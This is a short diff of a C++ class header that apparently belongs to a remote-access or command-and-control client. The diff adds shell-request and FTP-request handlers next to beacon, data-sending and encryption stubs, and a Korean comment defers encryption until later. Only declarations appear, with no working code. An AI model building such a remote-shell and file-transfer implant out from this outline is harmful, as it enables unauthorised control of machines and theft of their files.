@@ -31,7 +31,8 @@ public:
 	void sendBeacon();
 	void sendData(UCHAR DDtype, ULONG64 len, LPVOID stream);
 	void printParsedResponse(DDprotocol* resData, std::string data);
-	void handleRequest();
+	void handleShellRequest();
+	void handleFtpRequest(std::string path);
 	/* 암호화는 디버깅 편의를 위해서 마지막에 구현하는걸로 */
 	LPVOID dataEncrypt(LPVOID data);
 	LPVOID dataDecrypt(LPVOID data);
